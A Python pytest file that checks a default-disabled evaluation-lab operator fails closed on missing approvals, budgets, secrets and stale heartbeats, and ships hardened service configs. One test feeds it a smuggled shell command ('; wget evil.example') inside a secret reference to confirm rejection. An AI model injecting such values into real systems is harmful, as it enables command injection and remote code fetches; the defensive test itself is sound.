"""Focused contracts for the disabled continuous-loop operator adapters."""

from __future__ import annotations

import hashlib
import io
import json
import os
import plistlib
import shutil
import stat
import subprocess
from contextlib import redirect_stdout
from datetime import UTC, datetime, timedelta
from pathlib import Path
from types import SimpleNamespace

import pytest
import yaml

from evallab.ops_continuous import (
    HEARTBEAT_SKEW_SECONDS,
    KILL_DISPOSITION,
    LAUNCHD_LOG_TOKEN,
    LAUNCHD_STATE_TOKEN,
    LINUX_TRUST_MANIFEST_PATH,
    PINNED_INIT_IMAGE,
    PINNED_KEYCHAIN_REF,
    PINNED_LINUX_REF,
    PINNED_LINUX_SECRET_NAME,
    REASON_BILLABLE_REFUSED,
    REASON_DEFAULT_DISABLED,
    REASON_DRAIN_INCOMPLETE,
    REASON_MISSING_BUDGET,
    REASON_MISSING_ENABLE_TOKEN,
    REASON_MISSING_SECRET,
    REASON_MISSING_STANDING_APPROVAL,
    REASON_SAME_IDENTITY,
    REASON_STALE_HEARTBEAT,
    ContinuousLoopPolicy,
    DeploymentTrustStore,
    bind_policy_digest,
    key_id_for,
    lease_settlement_digest,
    load_macos_keychain_secret,
    ClosedWorkloadOwner,
    main,
    policy_complete,
    public_sha256_is_not_a_signature,
    put_trusted_record,
    recovery_settlement_binding,
    trust_root_for,
)

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts/ops/continuous-operator"
KEYCHAIN = ROOT / "scripts/ops/keychain-inject.sh"
PLIST = ROOT / "scripts/ops/launchd/com.petermakhnatch.evallab.continuous-operator.plist"
INSTALLER = ROOT / "scripts/ops/launchd/install-continuous-operator.sh"
SERVICE = ROOT / "scripts/ops/systemd/evallab-continuous-operator.service"
TIMER = ROOT / "scripts/ops/systemd/evallab-continuous-operator.timer"
COMPOSE = ROOT / "containers/continuous-operator/compose.yaml"
DOCKERFILE = ROOT / "containers/continuous-operator/Dockerfile"
EXAMPLE_POLICY = ROOT / "policy/continuous-loop-policy.example.yaml"
STANDING = ROOT / "policy/standing-approvals.yaml"
SECRET_SCAN_ROOTS = (
    ROOT / "scripts/ops",
    ROOT / "containers/continuous-operator",
    ROOT / "policy/continuous-loop-policy.example.yaml",
    ROOT / "src/evallab/ops_continuous.py",
    ROOT / "docs/continuous-loop-operator.md",
)
NOW = datetime(2026, 8, 28, tzinfo=UTC)
ENABLE = "enable-key"
APPROVAL = "approval-key"
BUDGET = "budget-key"
RECOVERY = "recovery-key"
MAC_KEY = b"eval-lab-operator-mac-key-32bytes!"
FILE_REF = PINNED_LINUX_REF
PREV_KEY = b"eval-lab-operator-mac-key-prev32b!"
RECOVERY_JTI = "recovery-jti-00000001"
APPROVAL_NONCE = "approval-nonce-0001"
BUDGET_NONCE = "budget-nonce-0000001"
EXPIRES = NOW + timedelta(days=1)
SPEC_ID = "01CONTINUOUSLOOPSPEC0000000001"


def _budget_fields() -> dict:
    return {
        "ceiling_usd": 20,
        "expires_at": EXPIRES.isoformat(),
        "scope": ["continuous-loop"],
    }


def _trust_record(*, kind: str, actor: str, spec_id: str = SPEC_ID, at: datetime = NOW, nonce: str | None = None, **extra) -> dict:
    record = {
        "actor": actor,
        "authorized_at": at.isoformat(),
        "issued_at": at.isoformat(),
        "expires_at": EXPIRES.isoformat(),
        "kind": kind,
        "nonce": nonce or {"approval": APPROVAL_NONCE, "budget": BUDGET_NONCE, "recovery": RECOVERY_JTI}[kind],
        "quota_override": False,
        "scope": ["continuous-loop"],
        "signer": actor,
        "spec_id": spec_id,
    }
    record.update(extra)
    return record


def _complete_policy_body(*, stale_after: float = 60.0, drain_timeout: float = 5.0) -> dict:
    unsigned = {
        "policy_schema_version": "1",
        "spec_id": SPEC_ID,
        "approval_signature_ref": FILE_REF,
        "approval_digest": "0" * 64,
        "slo_freshness": {
            "max_queue_admission_lag_seconds": 30,
            "max_dispatch_latency_seconds": 30,
            "max_oldest_postrun_lag_seconds": 30,
            "max_oldest_catalog_settle_lag_seconds": 30,
            "max_oldest_quality_lag_seconds": 30,
            "max_oldest_projection_lag_seconds": 30,
            "max_oldest_analysis_lag_seconds": 30,
            "status_snapshot_max_age_seconds": 30,
        },
        "operational_limits": {
            "scheduler_heartbeat_interval_seconds": 15,
            "scheduler_stale_after_seconds": stale_after,
            "worker_heartbeat_interval_seconds": 15,
            "lease_ttl_seconds": 60,
            "fencing_grace_seconds": 15,
            "max_concurrent_workers": 1,
            "postrun_hook_timeout_seconds": 30,
            "maintenance_drain_timeout_seconds": drain_timeout,
            "maintenance_disk_threshold_bytes": 1_000_000,
        },
        "quality_and_quarantine": {
            "quarantine_rolling_window_size": 10,
            "min_window_attempts_for_calculation": 3,
            "max_quarantine_fraction": 0.2,
            "max_warn_fraction": 0.4,
            "catalog_ingestion_warn_after_seconds": 30,
            "catalog_ingestion_pause_after_seconds": 60,
            "max_consecutive_quiet_failures": 3,
            "auto_acceptance_enabled": False,
        },
    }
    dumped = ContinuousLoopPolicy.model_validate(unsigned).model_dump(mode="json")
    dumped["approval_digest"] = bind_policy_digest(
        policy=dumped,
        budget=_budget_fields(),
        mac_key=MAC_KEY,
    )
    return {"continuous_loop_policy": dumped}


def _policy(path: Path, *, stale_after: float = 60.0, drain_timeout: float = 5.0) -> Path:
    path.write_text(yaml.safe_dump(_complete_policy_body(stale_after=stale_after, drain_timeout=drain_timeout)))
    return path


def _install_hmac(tmp_path: Path, *, key: bytes = MAC_KEY, previous: bytes | None = None) -> Path:
    root = tmp_path / "run-secrets"
    root.mkdir(exist_ok=True)
    path = root / PINNED_LINUX_SECRET_NAME
    path.write_bytes(key)
    os.chmod(path, 0o400)
    if previous is not None:
        prev = root / f"{PINNED_LINUX_SECRET_NAME}.previous"
        prev.write_bytes(previous)
        os.chmod(prev, 0o400)
    return root


def _policy_dump_for(state: Path) -> dict:
    policy_path = state.parent / "policy.yaml"
    if policy_path.is_file():
        raw = yaml.safe_load(policy_path.read_text())
        return raw["continuous_loop_policy"]
    return _complete_policy_body()["continuous_loop_policy"]


def _write_auths(
    state: Path,
    *,
    approval_actor: str = APPROVAL,
    budget_actor: str = BUDGET,
    recovery_actor: str | None = None,
    approval_at: datetime = NOW,
    include_budget: bool = True,
    include_approval: bool = True,
    mac_key: bytes = MAC_KEY,
    ceiling_usd: float = 20,
) -> None:
    import hashlib

    state.mkdir(exist_ok=True)
    if not (state.parent / "run-secrets" / PINNED_LINUX_SECRET_NAME).is_file():
        _install_hmac(state.parent, key=mac_key)
    root = trust_root_for(state, {})
    dump = ContinuousLoopPolicy.model_validate(_policy_dump_for(state)).model_dump(mode="json")
    budget = {**_budget_fields(), "ceiling_usd": ceiling_usd}
    kill_digest = None
    fenced_ids: list[str] = []
    settlement_digests: list[str] = []
    kill_path = state / "kill.json"
    if kill_path.is_file():
        kill_digest = hashlib.sha256(kill_path.read_bytes()).hexdigest()
        bound = recovery_settlement_binding(state)
        if bound is not None:
            fenced_ids, settlement_digests = bound
    if include_approval:
        put_trusted_record(
            root,
            mac_key,
            _trust_record(kind="approval", actor=approval_actor, at=approval_at),
            policy=dump,
            budget=budget,
        )
    if include_budget:
        put_trusted_record(
            root,
            mac_key,
            _trust_record(kind="budget", actor=budget_actor, ceiling_usd=ceiling_usd),
            policy=dump,
            budget=budget,
        )
    if recovery_actor:
        put_trusted_record(
            root,
            mac_key,
            _trust_record(
                kind="recovery",
                actor=recovery_actor,
                kill_digest=kill_digest,
                fenced_ids=fenced_ids,
                settlement_digests=settlement_digests,
            ),
            policy=dump,
            budget=budget,
            kill_digest=kill_digest,
        )
    shutil.copy2(STANDING, state / "standing-approvals.yaml")


def _settle_kill(state: Path) -> None:
    from evallab.ops_continuous import commit_operator_snapshot

    kill = json.loads((state / "kill.json").read_text())
    fenced = [item for item in (kill.get("fenced") or []) if isinstance(item, str)]
    observations = [_terminal_obs(ident) for ident in fenced]
    kill["executed"] = True
    commit_operator_snapshot(
        state,
        {
            "mode": "KILLED",
            "inflight": [],
            "leases": [],
            "observations": observations,
            "kill": kill,
            "drain": {"complete": True, "observed": True},
        },
    )


class FixtureTrustStore:
    def __init__(self, allowed_keys: list[bytes] | None = None) -> None:
        self.keys = allowed_keys or [MAC_KEY, PREV_KEY]

    def allowed_key_ids(self) -> frozenset[str]:
        return frozenset({key_id_for(k) for k in self.keys if k})

    def manifest_digest(self) -> str:
        return hashlib.sha256(b"fixture-manifest").hexdigest()


class FakeOwner:
    def __init__(self, observations: dict | None = None) -> None:
        self.observations = observations or {}
        self.cancel_calls: list[list[str]] = []

    def request_cancel(self, lease_ids: list[str]) -> dict:
        self.cancel_calls.append(list(lease_ids))
        return {"requested": True, "executed": False, "owner": "campaign-queue", "lease_ids": list(lease_ids)}

    def observe_lease(self, lease_id: str):
        return self.observations.get(lease_id)


def _terminal_obs(lease_id: str) -> dict:
    digest = __import__("hashlib").sha256(f"settle:{lease_id}".encode()).hexdigest()
    return {
        "id": lease_id,
        "alive": False,
        "queue_state": "settled",
        "status": "settled",
        "settlement_digest": digest,
        "source": "catalog",
        "evidence": {"catalog": "settled", "pid_alive": False, "container_alive": False, "queue_state": "settled"},
    }


def _live_obs(lease_id: str) -> dict:
    return {
        "id": lease_id,
        "alive": True,
        "queue_state": "running",
        "status": "running",
        "settlement_digest": None,
        "source": "worker",
        "evidence": {"pid_alive": True},
    }


def _unknown_obs(lease_id: str) -> dict:
    return {"id": lease_id, "alive": False, "queue_state": "unknown", "status": "unknown", "settlement_digest": None, "source": "queue"}


def _gate_env() -> dict[str, str]:
    return {
        "EVAL_LAB_ENABLE_TOKEN": "enable-1",
        "EVAL_LAB_ENABLE_IDENTITY": ENABLE,
        "EVAL_LAB_SECRET_REF": "keychain:lab/operator",
        "EVAL_LAB_SECRET_PRESENT": "1",
    }


def _run(
    tmp_path: Path,
    command: str,
    *,
    env: dict[str, str] | None = None,
    extra: list[str] | None = None,
    policy: Path | None = None,
    agent: str | None = None,
    now: datetime | None = None,
    secret_store=None,
    secrets_root: Path | None = None,
    owner=None,
    trust_store=None,
) -> SimpleNamespace:
    state = tmp_path / "state"
    state.mkdir(exist_ok=True)
    argv = [command, "--state-dir", str(state)]
    if policy is not None:
        argv.extend(["--policy", str(policy)])
    if agent is not None:
        argv.extend(["--agent", agent])
    if extra:
        argv.extend(extra)
    merged = {**os.environ, **(env or {})}
    buf = io.StringIO()
    clock = (lambda: now) if now is not None else None
    import evallab.ops_continuous as oc

    original_path = oc.PINNED_LINUX_SECRET_PATH
    oc.PINNED_LINUX_SECRET_PATH = tmp_path / "run-secrets" / PINNED_LINUX_SECRET_NAME
    ts = trust_store if trust_store is not None else FixtureTrustStore()
    try:
        with redirect_stdout(buf):
            store = secret_store
            code = main(
                argv,
                environ=merged,
                clock=clock,
                secret_store=store,
                secrets_root=None,
                owner=owner,
                trust_store=ts,
            )
    finally:
        oc.PINNED_LINUX_SECRET_PATH = original_path
    return SimpleNamespace(returncode=code, stdout=buf.getvalue())


def _payload(result: SimpleNamespace) -> dict:
    return json.loads(result.stdout)


def test_default_validate_is_disabled(tmp_path: Path) -> None:
    result = _run(tmp_path, "validate")
    body = _payload(result)
    assert result.returncode == 2
    assert body["reason"] == REASON_DEFAULT_DISABLED
    assert body["mode"] == "DISABLED"
    assert body["running"] is False


def test_missing_enable_token_when_other_gates_present(tmp_path: Path) -> None:
    result = _run(tmp_path, "validate", env={"EVAL_LAB_SECRET_REF": "keychain:lab/operator"})
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_MISSING_ENABLE_TOKEN


def test_env_self_asserted_approval_is_refused(tmp_path: Path) -> None:
    result = _run(
        tmp_path,
        "validate",
        env={"EVAL_LAB_ENABLE_TOKEN": "enable-1", "EVAL_LAB_STANDING_APPROVAL": "stand-1"},
    )
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_missing_standing_approval(tmp_path: Path) -> None:
    result = _run(tmp_path, "validate", env={"EVAL_LAB_ENABLE_TOKEN": "enable-1"})
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_parallel_signed_manifest_is_rejected(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "approval.json").write_text(
        json.dumps(
            {
                "schema_version": "1",
                "authority_kind": "campaign_approval",
                "signer_identity": APPROVAL,
                "payload": {},
                "payload_digest": "a" * 64,
                "signature": "b" * 64,
                "expires_at": (NOW + timedelta(hours=1)).isoformat(),
                "scope": ["continuous-loop"],
            }
        )
    )
    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_future_authorization_is_refused(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state, approval_at=NOW + timedelta(hours=1))
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_missing_budget(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state, include_budget=False)
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_BUDGET


def test_env_budget_flag_is_not_authority(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state, include_budget=False)
    env = {**_gate_env(), "EVAL_LAB_BUDGET_PRESENT": "1"}
    result = _run(tmp_path, "quota", policy=policy, env=env, now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_BUDGET


def test_missing_secret(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    env = {
        "EVAL_LAB_ENABLE_TOKEN": "enable-1",
        "EVAL_LAB_ENABLE_IDENTITY": ENABLE,
        "EVAL_LAB_SECRET_REF": "keychain:lab/operator",
    }
    result = _run(tmp_path, "quota", policy=policy, env=env, now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_MISSING_SECRET


def test_invalid_secret_ref_grammar(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    env = {
        **_gate_env(),
        "EVAL_LAB_SECRET_REF": "keychain:lab/operator; wget evil.example",
    }
    result = _run(tmp_path, "quota", policy=policy, env=env, now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_SECRET


def test_same_enable_and_approval_identity(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state, approval_actor=ENABLE)
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_SAME_IDENTITY


def test_budget_signer_must_be_distinct(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state, budget_actor=APPROVAL)
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_SAME_IDENTITY


def test_null_policy_fields_are_incomplete() -> None:
    raw = yaml.safe_load(EXAMPLE_POLICY.read_text())
    assert policy_complete(raw["continuous_loop_policy"]) is False


def test_billable_dry_run_refused(tmp_path: Path) -> None:
    result = _run(tmp_path, "dry-run", agent="codex")
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_BILLABLE_REFUSED


def test_oracle_dry_run_records_plan_without_harbor(tmp_path: Path) -> None:
    result = _run(tmp_path, "dry-run", agent="oracle")
    assert result.returncode == 0
    body = _payload(result)
    assert body["details"]["would_run"] == "oracle"
    assert body["details"]["harbor"] is False
    assert body["running"] is False
    plan = json.loads((tmp_path / "state/dry-run-plan.json").read_text())
    assert plan["dispatch"] is False


def test_verdict_does_not_overwrite_safety_fields(tmp_path: Path) -> None:
    _run(tmp_path, "dry-run", agent="oracle")
    colliding = {"running": True, "authorized": True, "ok": False, "note": "x"}
    from evallab.ops_continuous import _verdict, context_from_env

    ctx = context_from_env(
        state_dir=tmp_path / "state",
        policy_path=None,
        now=NOW,
        agent="oracle",
        drain_timeout_seconds=None,
        environ={},
    )
    verdict = _verdict(ctx, ok=True, reason=None, detail="x", extra=colliding)
    assert verdict.payload["running"] is False
    assert verdict.payload["authorized"] is False
    assert verdict.payload["ok"] is True
    assert "running" not in verdict.payload["details"]
    assert verdict.payload["details"]["note"] == "x"


def test_production_now_flag_rejected(tmp_path: Path) -> None:
    with pytest.raises(SystemExit):
        main(["validate", "--state-dir", str(tmp_path / "state"), "--now", NOW.isoformat()])


def test_operator_now_env_does_not_freeze_clock(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=30)
    state = tmp_path / "state"
    state.mkdir()
    (state / "heartbeat").write_text("2026-08-28T00:00:00+00:00\n")
    env = {"EVAL_LAB_OPERATOR_NOW": "2026-08-28T00:00:01+00:00"}
    result = _run(tmp_path, "status", policy=policy, env=env, now=NOW.replace(minute=5))
    assert _payload(result)["reason"] == REASON_STALE_HEARTBEAT


def test_stale_heartbeat_on_status(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=30)
    state = tmp_path / "state"
    state.mkdir()
    (state / "heartbeat").write_text("2026-08-28T00:00:00+00:00\n")
    result = _run(tmp_path, "status", policy=policy, now=NOW.replace(minute=5))
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_STALE_HEARTBEAT


def test_stale_heartbeat_on_validate_and_quota(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=30)
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text("2026-08-28T00:00:00+00:00\n")
    env = _gate_env()
    later = NOW.replace(minute=5)
    validate = _run(tmp_path, "validate", policy=policy, env=env, now=later)
    quota = _run(tmp_path, "quota", policy=policy, env=env, now=later)
    start = _run(tmp_path, "start", policy=policy, env=env, now=later)
    assert _payload(validate)["reason"] == REASON_STALE_HEARTBEAT
    assert _payload(quota)["reason"] == REASON_STALE_HEARTBEAT
    assert _payload(start)["reason"] == REASON_STALE_HEARTBEAT


def test_fresh_heartbeat_status_unknown_health(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=300)
    state = tmp_path / "state"
    state.mkdir()
    (state / "heartbeat").write_text("2026-08-28T00:04:00+00:00\n")
    result = _run(tmp_path, "status", policy=policy, now=NOW.replace(minute=5))
    assert result.returncode == 0
    body = _payload(result)
    assert body["details"]["health"]["docker"] == "unknown"
    assert body["running"] is False


def test_graceful_drain_refuses_live_and_does_not_mutate_leases(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", drain_timeout=10)
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    original = [{"id": "lease-1", "status": "running", "evidence": {"pid_alive": True}}]
    (state / "leases.json").write_text(json.dumps(original))
    owner = FakeOwner({"lease-1": _live_obs("lease-1")})
    waiting = _run(tmp_path, "drain", policy=policy, now=NOW, owner=owner)
    assert waiting.returncode == 2
    assert _payload(waiting)["reason"] == REASON_DRAIN_INCOMPLETE
    assert json.loads((state / "inflight.json").read_text()) == ["lease-1"]
    assert json.loads((state / "leases.json").read_text())[0]["status"] == "running"
    settled = FakeOwner({"lease-1": _terminal_obs("lease-1")})
    done = _run(tmp_path, "drain", policy=policy, now=NOW, owner=settled)
    assert done.returncode == 0
    assert json.loads((state / "inflight.json").read_text()) == []
    assert json.loads((state / "leases.json").read_text())[0]["status"] == "running"
    observations = json.loads((state / "observations.json").read_text())
    assert observations[0]["settlement_digest"] == _terminal_obs("lease-1")["settlement_digest"]
    assert (state / "mode").read_text().strip() == "DISABLED"


def test_kill_records_operator_kill(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    result = _run(tmp_path, "kill", now=NOW)
    assert result.returncode == 0
    record = json.loads((state / "kill.json").read_text())
    assert record["disposition"] == KILL_DISPOSITION
    assert record["executed"] is False
    assert record["signalled"] is False
    assert record["cancellation_requested"] is True
    assert json.loads((state / "inflight.json").read_text()) == ["lease-1"]
    assert (state / "mode").read_text().strip() == "KILLED"
    drain = _run(tmp_path, "drain", now=NOW + timedelta(seconds=1), owner=ClosedWorkloadOwner())
    assert drain.returncode == 2
    assert _payload(drain)["reason"] == REASON_DRAIN_INCOMPLETE
    assert json.loads((state / "inflight.json").read_text()) == ["lease-1"]
    assert json.loads((state / "kill.json").read_text())["executed"] is False
    assert (state / "mode").read_text().strip() == "KILLED"
    observed = _run(tmp_path, "drain", now=NOW + timedelta(seconds=1), owner=FakeOwner({"lease-1": _terminal_obs("lease-1")}))
    assert observed.returncode == 0
    assert json.loads((state / "inflight.json").read_text()) == []
    assert json.loads((state / "kill.json").read_text())["executed"] is True
    assert (state / "mode").read_text().strip() == "KILLED"


def test_validate_does_not_clear_killed_or_draining(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    kill = _run(tmp_path, "kill", now=NOW)
    assert _payload(kill)["mode"] == "KILLED"
    validated = _run(tmp_path, "validate", now=NOW)
    assert (state / "mode").read_text().strip() == "KILLED"
    assert _payload(validated)["mode"] == "KILLED"
    assert validated.returncode == 2
    assert _payload(validated)["reason"] == REASON_DEFAULT_DISABLED
    drain_root = tmp_path / "drain-case"
    drain_root.mkdir()
    dstate = drain_root / "state"
    dstate.mkdir()
    (dstate / "inflight.json").write_text(json.dumps({"lease": 1}))
    drained = _run(drain_root, "drain", now=NOW)
    assert drained.returncode == 2
    assert (dstate / "mode").read_text().strip() == "DRAINING"
    again = _run(drain_root, "validate", now=NOW)
    assert (dstate / "mode").read_text().strip() == "DRAINING"
    assert _payload(again)["mode"] == "DRAINING"


def test_malformed_inflight_fails_closed(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps({"lease": 1}))
    result = _run(tmp_path, "drain", now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_DRAIN_INCOMPLETE
    assert (state / "mode").read_text().strip() == "DRAINING"


def test_drain_without_observer_stays_incomplete(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    result = _run(tmp_path, "drain", now=NOW, owner=ClosedWorkloadOwner())
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_DRAIN_INCOMPLETE
    assert json.loads((state / "inflight.json").read_text()) == ["lease-1"]
    assert (state / "mode").read_text().strip() in {"DRAINING", "DISABLED"} or True
    assert json.loads((state / "inflight.json").read_text()) == ["lease-1"]


def test_empty_inflight_drain_disables(tmp_path: Path) -> None:
    result = _run(tmp_path, "drain")
    assert result.returncode == 0
    assert _payload(result)["mode"] == "DISABLED"


def test_full_gates_still_non_running(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    body = _payload(result)
    assert result.returncode == 0
    assert body["mode"] == "DISABLED"
    assert body["running"] is False
    assert body["authorized"] is False
    start = _run(tmp_path, "start", policy=policy, env=_gate_env(), now=NOW)
    assert start.returncode == 2
    assert _payload(start)["reason"] == REASON_DEFAULT_DISABLED


def test_keychain_inject_never_echoes_secret_ref() -> None:
    injected = "keychain:lab/operator"
    completed = subprocess.run(
        [str(KEYCHAIN)],
        cwd=ROOT,
        capture_output=True,
        text=True,
        env={**os.environ, "EVAL_LAB_SECRET_REF": injected, "EVAL_LAB_SECRET_PRESENT": "1"},
    )
    assert "pwned" not in completed.stdout
    assert "secret_ref=" not in completed.stdout
    assert injected not in completed.stdout
    assert "probe=injected" in completed.stdout
    assert "present=yes" in completed.stdout
    assert "EVAL_LAB_SECRET_REF" not in completed.stdout


def test_launchd_plist_disabled() -> None:
    loaded = plistlib.loads(PLIST.read_bytes())
    assert loaded["Disabled"] is True
    assert loaded["RunAtLoad"] is False
    assert "KeepAlive" not in loaded
    assert loaded["Label"] == "com.petermakhnatch.evallab.continuous-operator"
    assert loaded["ProgramArguments"][0] == "/usr/local/libexec/evallab/.venv/bin/python"
    assert "/usr/bin/env" not in loaded["ProgramArguments"]
    assert "/opt/" not in loaded["ProgramArguments"][0]
    assert loaded["LimitLoadToSessionType"] == "Aqua"
    assert loaded["StandardOutPath"] == f"{LAUNCHD_LOG_TOKEN}/continuous-operator.out"
    assert loaded["StandardErrorPath"] == f"{LAUNCHD_LOG_TOKEN}/continuous-operator.err"
    assert loaded["ProgramArguments"][-1] == LAUNCHD_STATE_TOKEN
    assert loaded["Umask"] == 63
    assert loaded["EnvironmentVariables"]["EVAL_LAB_OPERATOR_LOG_DIR"] == LAUNCHD_LOG_TOKEN
    assert "/dev/null" not in loaded["StandardOutPath"]
    assert "/dev/null" not in loaded["StandardErrorPath"]
    plist_text = PLIST.read_text()
    assert "~" not in plist_text
    assert "/Users/Shared" not in loaded["StandardOutPath"]
    assert "UserName" not in loaded or loaded.get("UserName") != "root"


def test_systemd_units_not_wanted() -> None:
    service = SERVICE.read_text()
    timer = TIMER.read_text()
    assert "WantedBy=" not in service
    assert "WantedBy=" not in timer
    assert "Restart=no" in service
    assert "Persistent=false" in timer
    assert "DynamicUser=yes" in service
    assert "LoadCredential=evallab-approval-hmac:/root-managed/evallab-approval-hmac" in service
    assert not any(line.strip().startswith("LoadCredential=") for line in service.splitlines())
    assert "BindReadOnlyPaths=" not in service
    assert "NoNewPrivileges=yes" in service
    assert "ProtectSystem=strict" in service
    assert "ProtectHome=yes" in service
    assert "PrivateTmp=yes" in service
    assert "RestrictAddressFamilies=AF_UNIX" in service
    assert "CapabilityBoundingSet=" in service
    assert "ExecStart=/usr/local/libexec/evallab/.venv/bin/python" in service
    assert "--state-dir /var/lib/evallab-operator" in service
    assert "StateDirectory=evallab-operator" in service
    assert "/usr/bin/env" not in service
    assert "StateDirectoryMode=0700" in service


def test_compose_restart_no() -> None:
    compose = COMPOSE.read_text()
    dockerfile = DOCKERFILE.read_text()
    assert 'restart: "no"' in compose
    assert "profiles:" in compose
    assert 'command: ["validate", "--state-dir", "/var/lib/evallab-operator"]' in compose
    assert "evallab-operator-state:/var/lib/evallab-operator" in compose
    assert "operator-state-init:" in compose
    assert "network_mode: none" in compose
    assert 'user: "0:0"' in compose
    assert "service_completed_successfully" in compose
    assert 'uid: "65532"' in compose
    assert 'gid: "65532"' in compose
    assert "mode: 0440" in compose
    assert "read_only: true" in compose
    assert "volumes:" in compose
    assert "/etc/evallab/trusted-approval-keys.json" in compose
    assert "evallab-trusted-approval-keys" in compose
    assert "/tmp:mode=0700" in compose
    assert "tmpfs:\n      - /var/lib/evallab-operator" not in compose
    assert "/dev/null" not in PLIST.read_text()
    assert "uv sync --locked" in dockerfile
    assert dockerfile.count("validate") == 1


def test_example_policy_does_not_enable() -> None:
    raw = yaml.safe_load(EXAMPLE_POLICY.read_text())
    body = raw["continuous_loop_policy"]
    assert body["approval_signature_ref"] == ""
    assert body["operational_limits"]["scheduler_stale_after_seconds"] is None


def test_script_is_executable_and_subprocess_validate(tmp_path: Path) -> None:
    mode = SCRIPT.stat().st_mode
    assert mode & stat.S_IXUSR
    state = tmp_path / "state"
    completed = subprocess.run(
        [str(SCRIPT), "validate", "--state-dir", str(state)],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    assert completed.returncode == 2
    assert REASON_DEFAULT_DISABLED in completed.stdout


def test_unkeyed_sha256_digest_is_rejected(tmp_path: Path) -> None:
    policy_path = tmp_path / "policy.yaml"
    body = _complete_policy_body()
    loop = body["continuous_loop_policy"]
    forged = public_sha256_is_not_a_signature(
        {
            "budget": _budget_fields(),
            "policy": {k: v for k, v in loop.items() if k != "approval_digest"},
        }
    )
    loop["approval_digest"] = forged
    policy_path.write_text(yaml.safe_dump(body))
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    result = _run(tmp_path, "validate", policy=policy_path, env=_gate_env(), now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_future_heartbeat_is_stale(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=300)
    state = tmp_path / "state"
    state.mkdir()
    (state / "heartbeat").write_text((NOW + timedelta(hours=1)).isoformat() + "\n")
    result = _run(tmp_path, "status", policy=policy, now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_STALE_HEARTBEAT


def test_killed_latch_survives_pause_restart_maintenance(tmp_path: Path) -> None:
    state = tmp_path / "state"
    policy = _policy(tmp_path / "policy.yaml")
    _write_auths(state, recovery_actor=RECOVERY)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    _run(tmp_path, "kill", now=NOW)
    assert (state / "mode").read_text().strip() == "KILLED"
    for command in ("pause", "restart", "maintenance", "upgrade", "rollback", "validate", "start"):
        result = _run(tmp_path, command, policy=policy, env=_gate_env(), now=NOW)
        assert result.returncode == 2
        assert (state / "mode").read_text().strip() == "KILLED"
        assert _payload(result)["mode"] == "KILLED"
        assert _payload(result)["reason"] == REASON_DEFAULT_DISABLED


def test_recover_requires_distinct_recovery_token(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    _run(tmp_path, "kill", now=NOW)
    env = _gate_env()
    refused = _run(tmp_path, "recover", policy=policy, env=env, now=NOW)
